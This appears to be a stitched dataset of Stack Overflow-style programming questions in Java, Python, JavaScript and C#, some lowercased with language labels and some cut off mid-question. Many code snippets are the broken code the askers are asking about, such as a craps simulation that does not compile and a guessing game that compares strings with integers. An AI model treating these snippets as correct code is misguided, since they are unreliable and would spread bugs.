&lt;/tr&gt;                              &lt;/table&gt;                          &lt;/span&gt;                     &lt;/a&gt;                 &lt;/div&gt;             &lt;/div&gt;         &lt;/div&gt;     &lt;/div&gt;     &lt;br/&gt;&lt;br/&gt;   &lt;/div&gt;           </code></pre>,javascript
java subclasses constructors with expanding parameters  i was wondering if it is possible to expand the constructors parameters for each subclass of the superclass.  for example:    <pre><code>public class car{ protected string regnum; protected car(string regnum){     this.regnum = regnum;   } } public class gascar extends car{ protected double gasemissions; protected gascar(double ge){     gasemissions = ge;   } } </code></pre>   is there a way where i could use the parameters in the car constructor in the gascar constructor by inheritance,java

guessing game python binary search  i can t figure out what s wrong with my code here. i am trying to have the user think of a number between 1 and 100 and then this program will be able to guess it. the program adds the high and low numbers of the range and divides by two and uses that as the guess. the user enters a 1 if the number the program guess is higher than their number  -1 if it is lower  and 0 if the guess is correct. after at most 7 guesses the number guessed should be right. when i run my code it constantly prints out the guess as 50 and never changes. it seems to never be running through the if statements. it should be running through the program and finding a new guess.   <pre><code>def main():     import random     print( guessing game )     print(  )     print( think of a number 1 and 100 inclusive.\nand i will guess what it is in 7 tries or less. )     print(  )     ready = input( are you ready  (y/n):  )     print(  )     if ready !=  y  and ready !=  n :         ready = input( are you ready  (y/n):  )     if ready ==  n :         print( bye )     if ready ==  y :         lo = 0         hi = 100         guess_high = 1         guess_same = 0         guess_low = -1           a = random.randint(1 100)         num_list = []         for i in range(1 100):             num_list.append(i)         while (lo &lt;= hi):             guess_count = 0             for guess_count in range(1 8):                 guess_count += 1                 guess = (lo + hi) // 2                 print( guess  guess_count   : the number you thought was  guess)                 user_response = input( enter 1 if my guess was high  -1 if low  and 0 if correct:  )                 if (user_response == 1):                     hi = guess - 1                     guess_count += 1                     guess = (lo + hi) // 2                 elif (user_response == -1):                     lo = guess + 1                     guess_count += 1                     guess = (lo + hi) // 2                 elif (user_response == 0):                     print( thank you for playing the guessing game. ) main()   </code></pre>,python

hung jvm consuming 100% cpu  we have a java server running on sun jre 6u20 on linux 32-bit (centos). we use the server hotspot with cms collector with the following options (i ve only provided the relevant ones):    <pre><code>-xmx896m -xss128k -xx:newsize=384m -xx:maxpermsize=96m -xx:+useparnewgc -xx:+useconcmarksweepgc </code></pre>   sometimes  after running for a while  the jvm seems to slip into a hung state  whereby even though we don t make any requests to the application  the cpu continues to spin at 100% (we have 8 logical cpus  so it looks like only one cpu does the spinning). in this state the jvm doesn t respond to sighup signals (kill -3) and we can t connect to it normally with jstack. we can connect with  jstack -f   but the output is dodgy (we can see lots of nullpointerexceptions from jstack apparently because it wasn t able to  walk  some stacks). so the  jstack -f  output seems to be useless.    we have run a stack dump from  gdb  though  and we were able to match the thread id that spins the cpu (we found that using  top  with a per-thread view -  h  option) with a thread stack that appears in the gdb result and this is how it looks like:

box  there seems to be enough memory available and the system is not swapping. has anyone come across such a situation  does it look like a jvm bug     <strong>update</strong>    i ve obtained some more information about this problem (it happened again on a server that has been running for more than 7 days). when the jvm entered the  hung  state it stayed like that for 2 hours until the server was manually restarted. we have obtained a core dump of the process and the gc log. we tried to get a heap dump as well  but  jmap  failed. we tried to use jmap -f but then only a 4mb file was written before the program aborted with an exception (something about the a memory location not being accessible). so far i think the most interesting information comes from the gc log. it seems that the gc logging stopped as well (possibly at the time when the vm thread went into the long loop):   <pre><code>657501.199: [full gc (system) 657501.199: [cms: 400352k-&gt;313412k(524288k)  2.4024120 secs]

the log (i ve added some  ....  in order to skip some lines that were not interesting). the fact that the server stayed in the hung state for 2 hours (probably trying to gc and compact the old generation) seems quite strange to me. also  the gc log stops suddenly with that message and nothing else gets printed any more  probably because the vm thread gets into some sort of infinite loop (or something that takes 2+ hours).,java

why javascript objects creation is dynamic   i have just thought about creating new objects in javascript. i ve read  that in js every object creation is dynamic.this means that you can create an object and after that you can add some properties inside.but fields  which were created in constructor  are dynamic too.    i know that in a lot of other languages we have object structure and you can t add something to object after creation.so the question is  why fields  which are written in constructor  are dynamic created,javascript

If you see the min value is sometimes single and sometimes repeating.
Hence I want to remove this repetition of min value. It has to be a single value.

So i want to parse the full string(very long string), and find if min has multiple values. If it has multiple value, then replace it with single value.

Example if 
min:[BKK213AB1CD23456,BKK213AB1CD23456] 
replace with 
min:BKK213AB1CD23456

"I'm running streamreader over a text file and storing the data into an arraylist. The data is separated by , and it basically stores appointment dates and times. Some Patients have only been seen twice so I have to add no data into the text file but still add the , to insure the streamreader moves over it.

However when it gets to the Patient that only has two visits it stops reading the file and just stores the data up to that point. I have a try catch error handling which tells me when it stops reading the file.

eg; 1, Name,DOB,12/12/2015,13/12/2015,,,,
    2, Name,DOB,11/11/2015,,,,

"I have a project inside the VS solution that loads correctly in VS2015, but it seems to be corrupted in VS2017 (RC2).

In the solution explorer it shows that its load failed and when I try to reload it I receive an error popup with the message Object reference not set to an instance of an object.

I thought that it might be because VS2017 changed somehow <code>.csproj</code> file automatically for their needs, but after compare it with the version within VS2015 solution I found out that they are not different.

Have anyone experienced something like that? And how it's possibly can be fixed?

"I'm wondering: How exactly is Roslyn related to MsBuild?

My understanding was that

<ol>
<li>Roslyn is a compilation engine</li>
<li>MsBuild is is mostly a set of specifications of how a project is set
up - i.e. basically a definition schema for .csproj, .sln files and
so on.</li>
</ol>

Then again, MsBuild also ships with an msbuild.exe - which, correct me if I'm wrong, is able to actually compile projects. But how would this tie in with Roslyn, assuming msbuild.exe can compile projects, but so can Roslyn?

Does msbuild.exe use Roslyn to compile, in case of MSBuild 15? Are they completely seperate? Am I misunderstanding anything?

And furthermore &amp; more specifally: Assuming I want programatically create simple .csproj files, and use Roslyn's MSBuildWorkspace to handle/populate and finally compile these.
Would the end user of my application need to have Microsoft's build tools installed on their machine? Or is this not necessary, as Roslyn would be able to read &amp; compile these independently of any local MSBuild installation?

            Debug.Log(JsonUtility.ToJson(col));

The debug log only prints {}. Why isn't it serializing anything? I've tested it out, and serializing a single SpriteData does exactly what it's supposed to do, but it won't work in the SpriteDataCollection.

"I'm currently working on an algorithm to schedule pub-crawling (it can be much more generic applied, though).
This is what is known:

<ul>
<li>There is a certain number of teams and bars, the amount of teams
never exceeding the amount of bars</li>
<li>The teams must visit all bars</li>
<li>The teams cannot be at the same bar at the same time</li>
<li>The whole process is temporal; teams are at the bars in the same discrete time intervals between the starting and ending time of the pub-crawl.</li>
</ul>

I'm thinking of this as a mix between the travelling salesman problem and some roster planning, but right now I've tried to implement it using brute force since I can't figure how to implement the mentioned mix. What I expect the result could look like:

<a href=https://i.stack.imgur.com/QikBR.png rel=nofollow noreferrer><img src=https://i.stack.imgur.com/QikBR.png alt=Expected result></a>

Brute force is working, but it's simply too slow. When all rows and columns are unique, a solution is found - just like Sudoku. The numbers can then be mapped to time intervals/arrival and departure time of specific bars.
I'm looking for ideas and suggestion, but an implementation is very welcome as well (C#).

At the moment I'm brute forcing by doing:

<ul>
<li>Initializing a 2D array with as many rows as teams and columns as bars. The values are initialized as well ranging from 1-columns.</li>
<li>Checking whether the array is a solution, if not: Shuffle the array and check again.</li>
</ul>

Lastly, I need to mention that when this can be done fast enough one more layer of complexity will be introduced. The chosen route for a specific team must be optimal meaning that all groups must take the most optimal routes in regard to travel time - to do this I'll use the Google Maps API. I guess if this first part of the algorithm is relatively fast the distance optimization can be brute forced.

Looking forward to creative solutions!

"I have been using dotnet core to create an application that runs in a Kubernetes cluster on Linux hosts. As I was testing it noticed getting exceptions when validating the CSRF tokens, that makes sense since I did not edit the machine key to be the same on every instance yet. As i proceeded to set the machine key in web.config i noticed this would no longer work in .Net Core. 

As is is now using the DataProtection API, the machine key no longer worked. I tried implementing the api into my application, but when i read i would need to use a network share to exchange the keys between all instances i was stunned. Surely there must be an easier (and better) way to accomplish this without having to rely on a share to be online right?

i tried to set the following in the Startup class in the ConfigureServices method:

<code>services.AddDataProtection().SetApplicationName(DockerTestApplication);</code>

I somehow expected the keys to be generated using the applicationname, but this did not resolve the issue.

I found some interesting docs that all use code that will no longer compile, i guess Microsoft changed up some things:

<a href=https://docs.microsoft.com/en-us/aspnet/core/security/data-protection/compatibility/replacing-machinekey rel=noreferrer>https://docs.microsoft.com/en-us/aspnet/core/security/data-protection/compatibility/replacing-machinekey</a>

Does anyone know a solution to this problem that will also run on Linux and has the ability to share the tokens over the network between instances?

Thanks in advance!

extending an object by reference  i have an <code>extend</code> method that extends objects like you would expect it would in javascript:   <pre><code>var obja = {a: true}; var objb = extend({b:false}  obja); console.log(objb); // {a: true  b: false} </code></pre>   however  i would like to extend the source s (<code>obja</code>) properties onto the target (<code>objb</code>) object by reference so that any changes made to the source are reflected in the target after the fact  like so:   <pre><code>var obja = {a: true}; var objb = extend({b: false}  obja); console.log(objb); // {a: true  b:false} obja.a = false; console.log(objb); // {a: false  b:false} </code></pre>   for instance  when you modify an object (which is always assigned by reference) things are working the way i would like them to:   <pre><code>var obja = {a:{a: true}}; var objb = _.extend({b: false}  obja); console.log(objb) // {a:{a:true}  b:false}; obja.a.a = false;  console.log(objb); // {a:{a:false}  b:false}; </code></pre>   so in other words  when changes are made to <code>obja</code> s non-object literal properties (or any value that isn t assigned by reference) i would like those changes to be reflected in <code>objb</code>.    i m fairly sure this isn t exactly possible without an additional helper method that would depend on some sort of object watch method that is triggered whenever an object changes.    thoughts     code from my <code>extend</code> method:   <pre><code>(l).extend = (l).merge = function () {     var args = (l).fn.__args(arguments  [{             deep:  bool          }  {              * :  obj:object          }     ])          target = (l)._object || args.obj          keys = []          obj  objs  copy  key  i  o;      // collect potential objects to merge     objs = (l).filter(args  function (value  index) {         if (index !==  obj  &amp;&amp;             (l).isplainobject(value) &amp;&amp; !((l).isequal(target  value))) {             return value;         }     });      // when target object is not selected globally     if (!args.obj) {         target = objs.shift();     }      // when target object is not selected globally and only a single object     // is passed extend the library itself     if (!(l)._global &amp;&amp; !objs.length) {         target = this;         objs[0] = args.obj;     }      // when a boolean is passed go deep     if (args.deep) {          // build property reference used to prevent never ending loops         (l).each(objs  function (index  value) {             keys.push((l).keys(value));             keys = (l).flatten(keys);         });          // add properties to all nested objects         (l).deep(target  function (depth  index  obj  ref) {             if ((l).indexof(keys  index) === -1) {                 for (i = 0; i &lt; objs.length; i++) {                     for (key in objs[i]) {                         if ((l).isplainobject(obj)) {                             copy = objs[i][key];                             obj[key] = copy;                         }                     }                 }             }         }   * );     }      // merge first level properties after going deep     for (i = 0; i &lt; objs.length; i++) {         if ((obj = objs[i]) !== null) {             for (key in obj) {                 copy = obj[key];                 if (target === copy) {                     continue;                 }                 target[key] = copy;             }         }     }     return (l).fn.__chain(target); }; </code></pre>,javascript

how may i split my javascript classes across multiple files and yet have them belong to the same namespace   i learnt that you could mimic namespaces in javascript by scoping your classes / objects inside a function expression or an object literal. that way the containing object or function provides a namespace and scope for the contained.    but for those to work  all the contained objects have to be within the same file  right     because if i had two namespace / naming container objects with the same name in two different files  they would overwrite each other depending on the order in which i included the source files.    <strong>file1.js</strong>   <pre><code>var automtomobiles =  {   function wheel() { ... } }; </code></pre>   <strong>file2.js</strong>   <pre><code>var automtomobiles =  {   function car() { ... } }; </code></pre>   how do i span objects / class definitions across multiple files but keep them within a same namespace,javascript

best practice with pygtk and builder xml files  i usually design gui with glade  thus producing a series of builder xml files (one such file for each application window).    now my idea is to define a class  e.g. mainwindow  that inherits from gtk.window and that implements all the signal handlers for the application main window. the problem is that when i retrieve the main window from the containing xml file  it is returned as a gtk.window instance.    the solution i have adopted so far is the following:    i have defined a class  window  in the following way   <pre><code>class window(): def __init__(self  win_name):     builder = gtk.builder()     self.builder = builder     builder.add_from_file( %s.glade  % win_name)     self.window = builder.get_object(win_name)     builder.connect_signals(self)  def run(self):     return self.window.run()  def show_all(self):     return self.window.show_all()  def destroy(self):     return self.window.destroy()  def child(self  name):     return self.builder.get_object(name) </code></pre>   in the actual application code i have then defined a new class  say mainwindow  that inherits frow window  and that looks like   <pre><code>class main(window): def __init__(self):     window.__init__(self   main )  ### signal handlers #####################################################  def on_mnu_file_quit_activated(self  widget  data = none):     ... </code></pre>   the string  main  refers to the main window  called  main   which resides into the xml builder file  main.glade  (this is a sort of convention i decided to adopt).    so the question is: how can i inherit from gtk.window directly  by defining  say  the class foo(gtk.window)  and recast the return value of builder.get_object(win_name) to foo,python

When I build my console application, I get the following build error:

<code>C:\Program Files\dotnet\sdk\1.0.4\NuGet.targets(97,5): error : Project Common is not compatible with net45 (.NETFramework,Version=v4.5). Project Common supports: netstandard1.6 (.NETStandard,Version=v1.6)</code>

I saw <a href=https://stackoverflow.com/questions/43109292/reference-a-net-standard-1-6-library-from-a-net-4-6-2-library>this question</a> and tried some of the suggestions provided there, but none of them worked.  So, this appears to be a different problem.  Please note that this occurs during the build of my solution and not referencing (explicit) NuGet packages in any way.

Finally, if it helps, I have a solution that demonstrates this issue here:

Could someone help me out how should I do this using code-first EF ? 

I have no idea how to create the <code>Tags</code> table, since it only has primitive types, and I'm not sure how to define those M2M mappings for <code>PostTags</code> and <code>ReadBy</code>.

I know the relational design is pretty simple since it uses mostly primitive data types, and under other circumstances I would have just made my DAL manually, but I would like to use EF code-first since I know I will benefit from it in the future when adding more features to the app.

Thanks a lot in advance for the help!

"I'm developing distributed application with help of <a href=http://masstransit-project.com/ rel=noreferrer>MassTransit</a> and <a href=https://www.rabbitmq.com/ rel=noreferrer>rabbitmq</a>

I have to provide ability to generate report on a web page without page reloading by click on a button, also I should call a windows service for data preparation (The service handles each request for 30sek - 1min).      

My first try based on this sample: <a href=https://github.com/MassTransit/Sample-RequestResponse rel=noreferrer>https://github.com/MassTransit/Sample-RequestResponse</a> 

<pre><code>    [HttpPost]
    public async Task&lt;HttpStatusCodeResult&gt; GenerateReport(string someJsonData)
    {    
        var serviceAddress = new Uri(ConfigurationManager.AppSettings[BaseLineRecordService]);
        var client = this.Bus.CreateRequestClient&lt;ICreateReportRequest, ICreateReportResponse&gt;(serviceAddress, TimeSpan.FromHours(1));
        ICreateReportResponse response = await client.Request(new CreateReportRequest());
        reportHub.ShowRepordData(response); // Update data by SingleR
        return new HttpStatusCodeResult(200);
    }
</code></pre>

But as I understand it' not a better approach, because I'm keeping connection during all data preparation.

I've read many articles and I have found three ways. Which way is preferred?

1) Like on this article <a href=http://www.maldworth.com/2015/07/19/signalrchat-with-masstransit-v3/ rel=noreferrer>http://www.maldworth.com/2015/07/19/signalrchat-with-masstransit-v3/</a>

how to create a java utility class for time sleep  i want to create an utility class for time sleep in java with predefined time which i want to call in another call.    for example actually i have:  my utility class:   <pre><code>public static void waitfor(int sec) {         try {             thread.sleep(sec * 1000l);         } catch (exception e) {             system.out.println(e.tostring());         }     } </code></pre>   with this class i can the method utility.waitfor(20); in another class and it works perfectly.    what i want is to initiate the time in utiliy class for example for 20s and call the method utility.waitfor(); i don t want to put the time inside the bracket in my second class.    because in the future if i want to modify the time i will not have to go through all the code and change the time. if i fix the time in utility class  this will work in everywhere    thank you for help,java

is there any way to confirm if the thread is killed at the end of execution   is there any way to confirm if the thread is killed at the end of execution  if the garbage collector takes  long time to destroy the threads even when they are available for gc  out of memory exceptions may arise. to get rid of those kind of issues  it would be good to know if the threads have been destroyed.     as of now  my understanding is that at the end of run method   the thread gets killed and we need not do anything explicitly to kill the thread instance.     thanks in advance!   <pre><code>class a {     public static void main()     {         thread t = new thread(new testa());          t.start();         thread t1 = new thread(new testb());          t1.start();         thread t2 = new thread(new testc());          t2.start();     } } class testa implements runnable { thread t;      public void run() {            for(...){            try{             }catch()            {             ....            }            }          }   } </code></pre>,java

aggregating similar objects using comparator without consistency with equals()  i have a set of immutable objects that implement equals() that strictly compare the member variables they hold. two objects are identical if the member variables are equal. hashcodes() are consitent with this.    i want to be able to aggregate these objects according to looser definitions of similarity. i was thinking of using comparator for this so that i could define a bunch of ad hoc similarity rules  but the javadoc states that comparator should be consistent with equals. is is ok to break the comparator contract with equals() to achieve this  or is there some better method/pattern/strategy for aggregating objects according to some similarity rules     examples may include:   <ul> <li>locations: equals() returns true if latlng and place name exactly equal  but comparator returns 0 if latlng within say 25m/50m/100m regardless of place name etc  or if only place names are equal regardless of latlng.</li> <li>dates: equals() returns true if long millis are equal  but comparator returns 0 if on same day/month/year etc..</li> <li>strings: equals return true if equalsignorecase is true  but comparator may removes spaces/special characters to reduce to some canonical form then run equals etc.</li> </ul>   many thanks in advance  riz,java

getting the last index  better to use len(list)-1 or use own variable   in my code below  would it be better to use the i = len(scheduled_meetings)-1 or the i=0/i+=1 method  i know the cost of len() is o(1) and it s probably more clear whats going on this way  but it gets calculated for every m in sorted_meetings. i=0 is set once then only incremented if something is appended to the list. will there even be a difference  both methods work against my test cases  just wanted to get some feedback on which would be better.   <pre><code>import operator  def answer(meetings):     # sort by earliest end time     sorted_meetings = sorted(meetings  key=operator.itemgetter(1))     # always select the earilest end time     scheduled_meetings = [sorted_meetings[0]]     i = 0 #method b     for m in sorted_meetings:         i = len(scheduled_meetings) - 1 #method a         if m[0] &gt;= scheduled_meetings[i][1] or m[1] &lt;= scheduled_meetings[i][0]:             scheduled_meetings.append(m)             i += 1 #method b      return len(scheduled_meetings) </code></pre>,python

trying to write a program that simulates a craps using specific rules  this is the question:    in the game of craps  a pass line bet proceeds as follows: two six-sided dice are rolled; the first roll of the dice in a craps round is called the   come out roll.  a come out roll of 7 or 11 automatically wins  and a come out roll of 2 3 or 12 automatically loses. if 4 5 6 8 9 or 10 is rolled on the come out roll  that number becomes  the point . the player keeps rolling the dice until either 7 or the point is rolled. if the point is rolled first  then the player wins the bet. if a 7 is rolled first  then the player loses    write a program that simulates a craps using these rules without human input. instead of asking for a wager  the program should calculate whether the player would win or lose. the programs should simulate rolling the two dice and calculate the sum. add a loop so that program plays several times. add counters that count how many times the player wins  and how many times the player loses. at the end of playing the games several times  computer the probability of wining ( wins/sins+losses)) and output the value    and this is what i did so far   <pre><code>  import java.util.scanner;      public class partb1  {      public static void main(string[] args)  {  int side1=1  side2=1   roll=1  lose=0  win=0  point=0  answer;      double winprob  loseprob;  side1= 1+(int)(math.random() *6);       side2= 1+(int)(math.random() *6);       scanner kb = new scanner(system.in);       do      {      roll = side1+side2;        if ( roll == 7 || roll == 11)      {        system.out.println(  come out wins );      winprob = win + 1;       }      else if ( roll ==2 || roll ==3 || roll ==12)      {        system.out.println(  come out loses  );       loseprob = lose +1;       }       else      {           side1= 1+(int)(math.random() *6);      side2= 1+(int)(math.random() *6);      point = roll;    roll = side1+side2;         system.out.println( the point );        system.out.println( you won the bet );        winprob = win + 1;    while(roll != point || roll!= 7);         side1= 1+(int)(math.random() *6);      side2= 1+(int)(math.random() *6);     roll = side1+side2;       }         if( roll ==7)       {        system.out.println( you lost the bet );      answer = kb.nextint();      }       else if (roll == point) {         system.out.println(win);     }    while(true)        {     system.out.println(  do you want to play again  0 for no  any number for yes  );                       if (answer ==0)                      {                        break;                      }                       winprob = (40/(40+60));                      system.out.println(  the probability of wining is   + winprob);                       loseprob = (40/(40-60));                      system.out.println(  the probability of losing is   + loseprob);             }       }       }        } </code></pre>   i keep getting this error   <pre><code>    1 error found:     file: h:\assignment 3\partb1.java  [line: 84]     error: syntax error  insert  while ( expression ) ;  to complete dostatement </code></pre>   i m not sure whether i missed something or did something wrong  any clue,java

However, I want to do the same thing with my ASP.NET MVC 5 project. How can handle dependency injection with ASP.MVC 5?

Also, is Dependency injection limited to controllers only or can it work with any class?

"I've developed a pretty simple web app using entity framework code first. I realized after hours of frustration that even though localdb is SQL Server Express it is actually not meant to be used with production when using 'publish' (the publish wizard). FYI I'm using EF 6.1.3, SQL Server 2014, VS 2013, and IIS 7.

If I understand correctly, when you click publish with localdb, all you're really doing is copying your localdb database to your IIS 7 server. I couldn't figure out why that when I updated my lodaldb database through VS migrations that my production server database wasn't being updated. I understand (and believe now) that it's actually two different instances of localdb, and hence not the same data.

OK whatever - I'm done with localdb and I created a real SQL Server 2014 db on my machine. I've googled for hours and can't figure out what to do now. I have some questions:

<ol>
<li>How do I manage this new database using EF? For instance, suppose I want to add a new column. First I add it to my localdb, do some testing, and do the migration using Add-Migration blah then Update-Database... Do I then have to generate a SQL script using VS and then manually run that on the production DB server?</li>
<li>I know this isn't great, but instead of using local DB with entity framework, can I just attach EF to a real staging SQL Server database (a test one) and skip all this localdb bull****? Then could I manage it using code-first migrations and keep everything in sync?</li>
<li>Am I supposed to use an Initializer? I've read conflicting reports about whether to use these or not for a production db (like this one)

public class PricedNotesInitializer: MigrateDatabaseToLatestVersion&lt;...,...>      {
}</li>
</ol>

It's frustrating that the only way I learn about this stuff is through blog posts from other people frustrated. I don't understand why the documentation is so garbage.

Thanks for your help and sorry for the rant.

"C# .NET 4.5, Windows 10, I have the following enum:

<pre><code>private enum Enums

And this program behaves in a very strange way:

<pre><code>public static void Main()
{
    Enums e;
    if (Enum.TryParse(12, out e))
    {
        Console.WriteLine(Parsed {0}, e);

    }
    Console.ReadLine();
}
</code></pre>

I would expect the result of the TryParse method to be false, but to my surprise 
the console shows Parsed 12.
In the Watch window it even shows that the value is 12 and it is of the Enums type!

This is true for any number string that I tried (e.g. 540), but not for strings that include letters (A12, 12A).

I can easily overcome this by first checking if it's a number-only string, but why is this the behaviour?
Is it by design?

general programming: is it better to do everything on one line instead of in steps   i m a newbie  and i ran into a problem in a lot of the online courses/free information i ve been looking at.    when is it better to  do everything on one line  rather than to piece it out step-by-step  in general  i like to do everything step by step  since it makes things easier to read and to debug; however  most solutions i look at do everything in  one big shot . for example  doing the javascript from javascript.info  there was a question that required splitting an input string  capitalizing items in an array  and then returning a string of the new array.    my solution:   <pre><code>&gt;let arr = input.split( - );  &gt;//step 1 - split the string &gt;let modified = arr.map((word  idx) =&gt; (idx &gt; 0   word.charat(0).touppercase() + &gt;word.slice(1) : word ) );  &gt;//step 2- capitalize every first letter except the first index &gt;return modified.join(  ); //step 3- return new joined string </code></pre>   presented the solution:   <pre><code>return str         .split( - ) // my-long-word -&gt; [ my    long    word ]         .map(            (word  index) =&gt; index == 0   word : word[0].touppercase() + word.slice(1)         )  // [ my    long    word ] -&gt; [ my    long    word ]         .join(  ); // [ my    long    word ] -&gt; mylongword </code></pre>   is it better to do everything in one shot  i understand that technically the presented solution is better (uses less variables  and thus memory). should i be trying to get in the habit of doing everything in 1 big shot  is this a good practice to have when i m (a few years down the road) interviewing for companies  the first solution makes things much easier to understand for me  and i would guess for anyone else who looks at my code later.    thanks for the help!,javascript

"I have searched for this and there are a number of previous answers but all seem overly complex. 

I'm new to C# and Windows development in general (previous Mac developer). 

I have written a simple console application in C# using Visual Studio Community edition. My application uses two third party libraries (CommandLineParser and json.NET) added to my project with NuGet from within VS. 

All I want to do is build my project as a standalone .exe file that can be simply run from a command prompt without having to worry about the end user having to install lots of DLLs (something that I'm not used to dealing with as a new Windows user).  I understand that the end user would need to have the .NET framework installed. Is there an idiot-proof guide to building a single .exe file in my use case?

"I'm using EF code-first approach and want to change the <code>Id</code> field to <code>guid</code> but can't seem to get past below error.

This is my first migration:

<pre><code>public partial class CreateDownloadToken : DbMigration
{
    public override void Up()
    {
        CreateTable(
            dbo.DownloadTokens,
            c =&gt; new
            {
                Id = c.Int(nullable: false, identity: true),
                FileId = c.Int(),
                UserId = c.String(nullable: false, maxLength: 128),
                ValidUntil = c.DateTime(nullable: false),
            })
            .PrimaryKey(t =&gt; t.Id)
            .ForeignKey(dbo.Files, t =&gt; t.FileId)
            .ForeignKey(dbo.Users, t =&gt; t.UserId, cascadeDelete: true)
            .Index(t =&gt; t.FileId)
            .Index(t =&gt; t.UserId);

    }

    public override void Down()
    {
        DropForeignKey(dbo.DownloadTokens, UserId, dbo.Users);
        DropForeignKey(dbo.DownloadTokens, FileId, dbo.Files);
        DropIndex(dbo.DownloadTokens, new[] { UserId });
        DropIndex(dbo.DownloadTokens, new[] { FileId });
        DropTable(dbo.DownloadTokens);
    }
}
</code></pre>

Later I realized that I need my <code>Id</code> column to be GUID so I changed my model file: 

<pre><code>public class DownloadToken
{
    [Key, DatabaseGenerated(DatabaseGeneratedOption.Computed)]
    public Guid Id { get; set; }

    public int? FileId { get; set; }

    [ForeignKey(FileId)]
    public virtual File File { get; set; }

    [Required]
    public string UserId { get; set; }

    [ForeignKey(UserId)]
    public virtual User User { get; set; }

    [Required]
    public DateTime ValidUntil { get; set; }
}
</code></pre>

When running <code>Add-Migration ChangeDownloadTokenIdToGuid</code> it generates this file:

<pre><code>public partial class ChangeDownloadTokenIdToGuid : DbMigration
{
    public override void Up()
    {
        DropPrimaryKey(dbo.DownloadTokens);
        AlterColumn(dbo.DownloadTokens, Id, c =&gt; c.Guid(nullable: false));
        AddPrimaryKey(dbo.DownloadTokens, Id);
    }

    public override void Down()
    {
        DropPrimaryKey(dbo.DownloadTokens);
        AlterColumn(dbo.DownloadTokens, Id, c =&gt; c.Int(nullable: false, identity: true));
        AddPrimaryKey(dbo.DownloadTokens, Id);
    }
}
</code></pre>

Running this file with <code>Update-Database</code> causes this error:

<pre><code>Identity column 'Id' must be of data type int, bigint, smallint, tinyint, or decimal or numeric with a scale of 0, and constrained to be nonnullable.
</code></pre>

Any ideas why this might be happening?

"My understanding is that ASP.NET Core middleware is run when a request is ready to be processed. But if the app is under load and ASP.NET Core can not process all the requests as they come in, they are put in a queue somewhere? I don't know whether this is some managed queue inside Kestrel or whether it has something to do with libuv.

I would like to be able to know how long a given request is spent in this queue. Is there something on HttpContext that can tell me this?

"I apologise, I know this question has been asked a thousand times before by C# beginners (of which I am one), but all the answers I can find say I need to either instantiate the class, or make it static. My class <em>is</em> instantiated, and I am trying to access the <em>instance</em>. Can anyone take a look at my code and work out what is going wrong?

<pre><code>public class RocketSimMain {

    public RocketShip test = new RocketShip ();

    public static void Main() {

        ... // Do some setup stuff here

        //Run the game loop
        while (!EndGameRequested()) {
            test.Move();  &lt;- Object instance error here.
        }
    }

As you can see, I'm instantiating the class and accessing the instance. The only thing that works is instantiating the class inside the Main method, but then I'm not able to access it in other classes.

change settings from outside a module  i think it s not possible  but i ask anyway  maybe i ll learn something.    suppose i have a piece of a code  from an external module i want to use:   <pre><code>from __future__ import print_function  import webbrowser import time  from .api import twitter  json from .oauth import oauth  write_token_file from .oauth2 import oauth2  write_bearer_token_file  try:     _input = raw_input except nameerror:     _input = input  def oauth_dance(app_name  consumer_key  consumer_secret  token_filename=none):             perform the oauth dance with some command-line prompts. return the     oauth_token and oauth_token_secret.     provide the name of your app in `app_name`  your consumer_key  and     consumer_secret. this function will open a web browser to let the     user allow your app to access their twitter account. pin     authentication is used.     if a token_filename is given  the oauth tokens will be written to     the file.             print( hi there! we re gonna get you all set up to use %s.  % app_name)     twitter = twitter(         auth=oauth(        consumer_key  consumer_secret)          format=    api_version=none)     oauth_token  oauth_token_secret = parse_oauth_tokens(         twitter.oauth.request_token(oauth_callback= oob ))     print(    in the web browser window that opens please choose to allow access. copy the pin number that appears on the next page and paste or type it here:    )     oauth_url = ( https://api.twitter.com/oauth/authorize oauth_token=  +                  oauth_token)     print( opening: %s\n  % oauth_url)      try:         r = webbrowser.open(oauth_url)         time.sleep(2) # sometimes the last command can print some                       # crap. wait a bit so it doesn t mess up the next                       # prompt.         if not r:             raise exception()     except:         print(    uh  i couldn t open a browser on your computer. please go here to get your pin:     + oauth_url)     oauth_verifier = _input( please enter the pin:  ).strip()     twitter = twitter(         auth=oauth(             oauth_token  oauth_token_secret  consumer_key  consumer_secret)          format=    api_version=none)     oauth_token  oauth_token_secret = parse_oauth_tokens(         twitter.oauth.access_token(oauth_verifier=oauth_verifier))     if token_filename:         write_token_file(             token_filename  oauth_token  oauth_token_secret)         print()         print( that s it! your authorization keys have been written to %s.  % (             token_filename))     return oauth_token  oauth_token_secret </code></pre>   i m calling the interesting function like this:   <pre><code>twitter.oauth_dance( my app name   consumer_key  consumer_secret  my_twitter_creds) </code></pre>   i would like to change the input method (see the beginning of the code  in the try block)  but without changing the code of the module. i want to do it from the user side.    is it possible      edit:    a not working example:   <pre><code>import twitter  twitter.oauth_dance._input = none # twitter._input = none   consumer_key =  hi  consumer_secret =  hello   my_twitter_creds =  ./config/twitter_credentials   if not os.path.exists(my_twitter_creds):     twitter.oauth_dance( my app name   consumer_key                          consumer_secret  my_twitter_creds)   oauth_token  oauth_secret = twitter.read_token_file(my_twitter_creds)  tweet = twitter.twitter(auth=twitter.oauth(oauth_token  oauth_secret                                             consumer_key  consumer_secret))  tweet.statuses.update(status= hello  world! ) </code></pre>,python
asynchronousfilechannel write operation  blocks sometimes   i recently started using java asynchronousfilechannel for a project of mine  where i want to write to files as quick as possible. when i came to test my project  i realised that maybe read and write operations where not really asynchronous for me! i made a very simple test program to see if write and read methods are blocking or not  by writing bytes to 2 files  one for each of my disks.    <pre><code>bytebuffer bufferc=bytebuffer.allocate(75000000);//~75mb bytebuffer bufferd=bytebuffer.allocate(75000000); for (int i=0; i&lt;75000000; i++) {   bufferc.put((byte)1);   bufferd.put((byte)1); }  bufferc.flip(); bufferd.flip();  executorservice executor = executors.newfixedthreadpool(10); asynchronousfilechannel channelc =asynchronousfilechannel.open(paths.get( c:\\ppp )  getreadwriteoptions() executor  new fileattribute&lt; &gt;[0]); asynchronousfilechannel channeld =asynchronousfilechannel.open(paths.get( d:\\ppp )  getreadwriteoptions()  executor  new fileattribute&lt; &gt;[0]);  long  start = system.currenttimemillis();    system.out.println( start ); future futurec=channelc.write(bufferc  0); system.out.println(futurec.isdone()); future futured=channeld.write(bufferd  0); system.out.println(futured.isdone()); long elapsedtimec = system.currenttimemillis()- start;   channelc.close(); channeld.close(); system.out.println( time= +elapsedtimec); </code></pre>   so  im writing two buffers  into two different files. because each buffer is about 75 mb  i suppose that each buffer cannot be written immediatly to my disk  so i would expect as my output something  like   <pre><code>false false time=  </code></pre>   which would mean for me that the write operations are  given  to the 